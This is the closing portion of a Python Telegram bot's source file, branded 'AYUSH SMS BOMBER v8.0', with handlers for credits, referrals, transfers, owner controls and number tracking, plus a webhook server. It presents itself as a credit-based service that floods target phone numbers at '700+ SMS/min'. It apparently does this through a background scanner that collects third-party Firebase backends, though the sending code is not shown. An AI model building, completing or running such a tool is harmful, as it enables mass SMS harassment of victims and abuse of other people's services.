        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:protected_list")
async def owner_protected_list(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access!", show_alert=True)
        return
    protected = d.get("protected_numbers", {})
    if not protected:
        await cq.message.edit_text(
            f"{em(EMOJI_LOCK, '🔐')} <b>Protected</b>\n\n❌ None",
            reply_markup=kb([(f"{sc('back')}", "owner:home")]),
            parse_mode="HTML"
        )
        return
    lines = [f"{em(EMOJI_LOCK, '🔐')} <b>Protected</b>\n"]
    for num, by in protected.items():
        lines.append(f"📞 <code>{num}</code> — by <code>{by}</code>")
    rows = []
    if is_owner(cq.from_user.id, d):
        rows.append([btn("ʀᴇᴍᴏᴠᴇ", "owner:protected_remove", EMOJI_CROSS, "🗑", style="danger")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")])
    await cq.message.edit_text("\n".join(lines), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:protected_remove")
async def owner_protected_remove(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    protected = d.get("protected_numbers", {})
    if not protected:
        await cq.answer("❌ None!", show_alert=True)
        return
    rows = [[btn(num, f"owner:protected_del:{num}", EMOJI_CROSS, "🗑", style="danger")] for num in protected]
    rows.append([btn("ʙᴀᴄᴋ", "owner:protected_list", EMOJI_GEAR, "🔙", style="primary")])
    await cq.message.edit_text(
        f"{em(EMOJI_CROSS, '🗑')} <b>Remove Protected</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:protected_del:"))
async def owner_protected_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    number = cq.data.split("owner:protected_del:", 1)[1]
    if number in d.get("protected_numbers", {}):
        del d["protected_numbers"][number]
        save(d)
        global PROTECTED_NUMBERS
        PROTECTED_NUMBERS = d["protected_numbers"]
        await cq.answer(f"✅ Removed!", show_alert=True)
    await owner_protected_list(cq, state)

@R.callback_query(F.data == "owner:track")
async def owner_track(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.track_number)
    await cq.message.edit_text(
        f"{em(EMOJI_STAR, '📊')} <b>Track Number</b>\n\nNumber:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.track_number)
async def owner_track_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit():
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid!", parse_mode="HTML")
        return
    await state.clear()
    all_h = d.get("sms_history", {})
    users_sent = []
    for uid_str, hist in all_h.items():
        for e in hist:
            if e.get("number") == number:
                udata = d.get("users", {}).get(uid_str, {})
                users_sent.append({
                    "uid": int(uid_str),
                    "name": udata.get("name", "?"),
                    "ts": e.get("timestamp", 0)
                })
                break
    if not users_sent:
        await msg.answer(
            f"{em(EMOJI_STAR, '📊')} <code>{number}</code>\n\n❌ No one sent to this number.",
            reply_markup=kb([(f"{sc('back')}", "owner:home")]),
            parse_mode="HTML"
        )
        return
    lines = [f"{em(EMOJI_STAR, '📊')} <code>{number}</code>\n"]
    for e in users_sent:
        lines.append(f"• <code>{e['uid']}</code> — {e['name'][:20]} — {fmt_time(e['ts'])}")
    await msg.answer("\n".join(lines), reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")

# ═══════════════════════════════════════════════════════════════
# ║  USER VIEWS (credits, refer, stats, info, history)
# ═══════════════════════════════════════════════════════════════
@R.callback_query(F.data == "user:credits")
async def user_credits(cq: CallbackQuery, state: FSMContext):
    d = load()
    credits = get_user_credits(cq.from_user.id, d)
    await cq.answer(f"💰 Credits: {credits}\n👑 Owner: {SUPER_ADMIN_NAME}", show_alert=True)

@R.callback_query(F.data == "user:refer")
async def user_refer(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    code = generate_user_refer_code(uid, d)
    save(d)
    ref_credits = d.get("settings", {}).get("ref_credits", 0)
    me = await cq.bot.get_me()
    await cq.message.edit_text(
        f"{em(EMOJI_STAR, '👥')} <b>Referral</b>\n\n"
        f"Per referral: <b>{ref_credits}</b> credits\n\n"
        f"{em(EMOJI_GIFT, '🎁')} Code: <code>{code}</code>\n"
        f"🔗 https://t.me/{me.username}?start={code}",
        reply_markup=kb([(f"{sc('back')}", "user:home")]),
        parse_mode="HTML",
        disable_web_page_preview=True
    )

@R.callback_query(F.data == "user:stats")
async def user_stats(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    ud = d["users"].get(str(uid), {})
    await cq.message.edit_text(
        f"{em(EMOJI_STAR, '📊')} <b>Your Stats</b>\n\n"
        f"💰 Credits: <b>{ud.get('credits', 0)}</b>\n"
        f"📤 Sent: <b>{ud.get('uses', 0)}</b>\n"
        f"📅 Joined: <b>{fmt_time(ud.get('joined_at', 0))}</b>",
        reply_markup=kb([(f"{sc('back')}", "user:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "user:sms_history")
async def user_sms_history(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    hist = d.get("sms_history", {}).get(str(uid), [])[-10:]
    if not hist:
        text = f"{em(EMOJI_GEAR, '📜')} <b>History</b>\n\n<i>Empty</i>"
    else:
        lines = [f"{em(EMOJI_GEAR, '📜')} <b>Last 10</b>\n"]
        for i, e in enumerate(reversed(hist), 1):
            lines.append(f"{i}. {fmt_time(e.get('timestamp', 0))} — {mask_number(e.get('number', '?'))} — {e.get('status')}")
        text = "\n".join(lines)
    await cq.message.edit_text(text, reply_markup=kb([(f"{sc('back')}", "user:home")]), parse_mode="HTML")

@R.callback_query(F.data == "user:info")
async def user_info(cq: CallbackQuery, state: FSMContext):
    await cq.message.edit_text(
        f"{em(EMOJI_GEAR, 'ℹ️')} <b>AYUSH SMS BOMBER {_VERSION}</b>\n\n"
        f"{em(EMOJI_CROWN, '👤')} Developer: <a href='{SUPER_ADMIN_LINK}'>{SUPER_ADMIN_NAME}</a>\n"
        f"{em(EMOJI_FIRE, '🔥')} Fast & reliable SMS service\n\n"
        f"<i>Credits needed for use. Refer friends for free credits!</i>",
        reply_markup=kb([(f"{sc('back')}", "user:home")]),
        parse_mode="HTML",
        disable_web_page_preview=True
    )

@R.callback_query(F.data == "user:transfer")
async def user_transfer(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not can_use(uid, d):
        await cq.answer("⛔ No access!", show_alert=True)
        return
    cur = get_user_credits(uid, d)
    if cur < 2:
        await cq.answer("❌ Need 2+ credits!", show_alert=True)
        return
    await state.set_state(S.transfer_credits_uid)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💸')} <b>Transfer</b>\n\nYour: {cur}\nMax: {cur//2}\n\nTarget User ID:",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.transfer_credits_uid)
async def user_transfer_uid(msg: Message, state: FSMContext):
    d = load()
    try:
        tgt = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID!", parse_mode="HTML")
        return
    if tgt == msg.from_user.id:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Self transfer!", parse_mode="HTML")
        return
    if str(tgt) not in d.get("users", {}):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} User not found!", parse_mode="HTML")
        return
    await state.update_data(transfer_target=tgt)
    await state.set_state(S.transfer_credits_amount)
    cur = get_user_credits(msg.from_user.id, d)
    await msg.answer(
        f"{em(EMOJI_MONEY, '💸')} Amount? (max {cur//2})",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.transfer_credits_amount)
async def user_transfer_amount(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    try:
        amt = int(msg.text.strip())
        if amt < 1: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid!", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    tgt = fsmd.get("transfer_target")
    cur = get_user_credits(uid, d)
    if amt > cur // 2:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Max {cur//2}!", parse_mode="HTML")
        return
    if not deduct_credits(uid, amt, d):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Failed!", parse_mode="HTML")
        return
    add_credits(tgt, amt, d)
    save(d)
    await state.clear()
    try:
        await msg.bot.send_message(tgt, f"{em(EMOJI_MONEY, '💸')} +{amt} credits from <code>{uid}</code>", parse_mode="HTML")
    except: pass
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Transferred {amt}c to <code>{tgt}</code>",
        reply_markup=kb([(f"{sc('home')}", "user:home")]),
        parse_mode="HTML"
    )

# ═══════════════════════════════════════════════════════════════
# ║  FORCE JOIN CHECK CALLBACK
# ═══════════════════════════════════════════════════════════════
@R.callback_query(F.data == "fj:check")
async def fj_check(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    d = load()
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.answer("❌ Still not joined!", show_alert=True)
        return
    await cq.answer("✅ Verified!", show_alert=True)
    if is_owner(uid, d):
        await cq.message.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    elif is_admin(uid, d):
        await cq.message.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
    else:
        await cq.message.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

# ═══════════════════════════════════════════════════════════════
# ║  EXPORT / NOOP
# ═══════════════════════════════════════════════════════════════
@R.callback_query(F.data == "owner:export_script")
async def owner_export_script(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await cq.answer("📤 Exporting...")
    try:
        script_path = os.path.abspath(__file__)
        await cq.message.reply_document(
            document=FSInputFile(script_path),
            caption=f"{em(EMOJI_GEAR, '📤')} Script — {_VERSION}",
            parse_mode="HTML"
        )
    except Exception as e:
        await cq.answer(f"❌ {str(e)[:40]}", show_alert=True)

@R.callback_query(F.data == "noop")
async def noop(cq: CallbackQuery):
    await cq.answer()

# ═══════════════════════════════════════════════════════════════
# ║  GLOBAL EXCEPTION HANDLER (Crash Recovery)
# ═══════════════════════════════════════════════════════════════
def _global_excepthook(exc_type, exc_value, exc_tb):
    log.critical(f"UNCAUGHT: {exc_type.__name__}: {exc_value}", exc_info=(exc_type, exc_value, exc_tb))

sys.excepthook = _global_excepthook

# ═══════════════════════════════════════════════════════════════
# ║  AIOGRAM ERROR HANDLER — silent error recovery
# ═══════════════════════════════════════════════════════════════
@R.errors()
async def error_handler(event: Exception):
    log.error(f"Handler error: {type(event).__name__}: {event}")
    return True

# ═══════════════════════════════════════════════════════════════
# ║  WEB APP — HEALTH CHECK + WEBHOOK ROUTE (Render Ready)
# ═══════════════════════════════════════════════════════════════
_BOT_INSTANCE: Optional[Bot] = None
_DP_INSTANCE: Optional[Dispatcher] = None

async def _web_health(request: web.Request) -> web.Response:
    """Health check endpoint for Render / uptime monitors."""
    return web.json_response({
        "status": "ok",
        "version": _VERSION,
        "time": datetime.now().isoformat(),
        "devices_online": len(CACHED_DEVICES),
        "active_sessions": len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()]),
    })

async def _web_webhook(request: web.Request) -> web.Response:
    """Telegram webhook endpoint."""
    try:
        if _BOT_INSTANCE is None or _DP_INSTANCE is None:
            return web.json_response({"error": "bot not ready"}, status=503)
        update_data = await request.json()
        from aiogram.types import Update
        update = Update.model_validate(update_data, context={"bot": _BOT_INSTANCE})
        await _DP_INSTANCE.feed_update(_BOT_INSTANCE, update)
        return web.json_response({"ok": True})
    except Exception as e:
        log.error(f"Webhook error: {e}")
        return web.json_response({"ok": False, "error": str(e)}, status=500)

async def _web_root(request: web.Request) -> web.Response:
    return web.Response(
        text=f"<h1>🚀 AYUSH SMS BOMBER {_VERSION}</h1><p>Bot is running!</p>",
        content_type="text/html"
    )

def build_web_app() -> web.Application:
    app = web.Application()
    app.router.add_get("/", _web_root)
    app.router.add_get("/health", _web_health)
    app.router.add_get("/healthz", _web_health)  # Render common path
    app.router.add_post(WEBHOOK_PATH, _web_webhook)
    return app

# ═══════════════════════════════════════════════════════════════
# ║  MAIN — Webhook on Render, Polling locally
# ═══════════════════════════════════════════════════════════════
async def main():
    global _BOT_INSTANCE, _DP_INSTANCE
    
    bot = Bot(token=BOT_TOKEN, parse_mode="HTML")
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(R)
    _BOT_INSTANCE = bot
    _DP_INSTANCE = dp
    
    me = await bot.get_me()
    log.info(f"✅ @{me.username} — {_VERSION} starting...")
    
    # Warm up HTTP pool
    await get_http_session()
    log.info("✅ HTTP session pool warmed up")
    
    # Load firebase.txt on boot
    try:
        backup = load_backup_firebases()
        if backup:
            d = load()
            d["backup_firebases"] = backup
            d["_backup_mtime"] = os.path.getmtime(_BACKUP_FIREBASE_FILE) if os.path.exists(_BACKUP_FIREBASE_FILE) else 0
            save(d)
            log.info(f"📁 Loaded {len(backup)} backup firebases from firebase.txt")
    except Exception as e:
        log.warning(f"Backup firebase load failed: {e}")
    
    # Load protected numbers into memory
    try:
        d = load()
        PROTECTED_NUMBERS.clear()
        PROTECTED_NUMBERS.update(d.get("protected_numbers", {}))
    except: pass
    
    # Start background scanner
    scanner_task = asyncio.create_task(background_firebase_scanner(bot))
    log.info("✅ Background scanner started (45s interval)")
    
    # Notify owner on boot
    try:
        d = load()
        total_fbs = len(get_all_firebases(d))
        await bot.send_message(
            MAIN_OWNER,
            f"{em(EMOJI_ROCKET, '🚀')} <b>{_VERSION} ONLINE</b>\n"
            f"@{me.username}\n\n"
            f"{em(EMOJI_GEAR, '🕐')} {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"{em(EMOJI_FIRE, '🔥')} Total firebases: <b>{total_fbs}</b>\n"
            f"{em(EMOJI_STAR, '⚡')} Fast speed: <b>700+ SMS/min</b>\n"
            f"{em(EMOJI_GEAR, '🔄')} Scanner: <b>every 45s</b>",
            parse_mode="HTML"
        )
    except Exception as e:
        log.warning(f"Owner notify: {e}")
    
    # Mode detection: webhook (Render) or polling (local)
    use_webhook = bool(WEBHOOK_URL and WEBHOOK_URL.startswith("https://"))
    
    if use_webhook:
        # ═══ WEBHOOK MODE (Render) ═══
        log.info(f"🌐 WEBHOOK MODE — {WEBHOOK_URL}")
        
        # Build & start aiohttp web server
        app = build_web_app()
        runner = web.AppRunner(app, access_log=None)
        await runner.setup()
        site = web.TCPSite(runner, WEBAPP_HOST, WEBAPP_PORT)
        await site.start()
        log.info(f"✅ Web server listening on {WEBAPP_HOST}:{WEBAPP_PORT}")
        
        # Register webhook with Telegram
        webhook_full = WEBHOOK_URL.rstrip("/") + WEBHOOK_PATH
        try:
            await bot.delete_webhook(drop_pending_updates=True)
            await bot.set_webhook(
                webhook_full,
                allowed_updates=dp.resolve_used_update_types(),
                max_connections=100,
                drop_pending_updates=True,
            )
            log.info(f"✅ Webhook registered: {webhook_full}")
        except Exception as e:
            log.error(f"❌ Webhook registration failed: {e}")
            log.info("⚠️ Falling back to polling mode...")
            use_webhook = False
    
    if not use_webhook:
        # ═══ POLLING MODE (local / dev) ═══
        log.info("🔄 POLLING MODE")
        try:
            await bot.delete_webhook(drop_pending_updates=True)
        except: pass
        await dp.start_polling(
            bot,
            allowed_updates=dp.resolve_used_update_types(),
            drop_pending_updates=True,
            handle_signals=False,
        )
    
    # Keep event loop alive (webhook mode)
    if use_webhook:
        log.info("🚀 Bot ready — listening for updates via webhook")
        try:
            await asyncio.Event().wait()
        except (KeyboardInterrupt, SystemExit):
            pass
    
    # Graceful shutdown
    log.info("🛑 Shutting down...")
    try:
        scanner_task.cancel()
        if scanner_task and not scanner_task.done():
            await scanner_task
    except: pass
    if _HTTP_SESSION and not _HTTP_SESSION.closed:
        await _HTTP_SESSION.close()
    try:
        await bot.session.close()
    except: pass
    log.info("✅ Shutdown complete")

# ═══════════════════════════════════════════════════════════════
# ║  ENTRY POINT
# ═══════════════════════════════════════════════════════════════
if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        log.info("Interrupted by user")
    except Exception as e:
        log.critical(f"FATAL: {e}", exc_info=True)
        sys.exit(1)

# 🗿 Bot Developer - @GOD_AYUSH
# 🔰 Developer Channel - @Ayush_Hackz
# ⚡ AYUSH SMS BOMBER v8.0 — PRO MAX
# 🚀 END OF FILE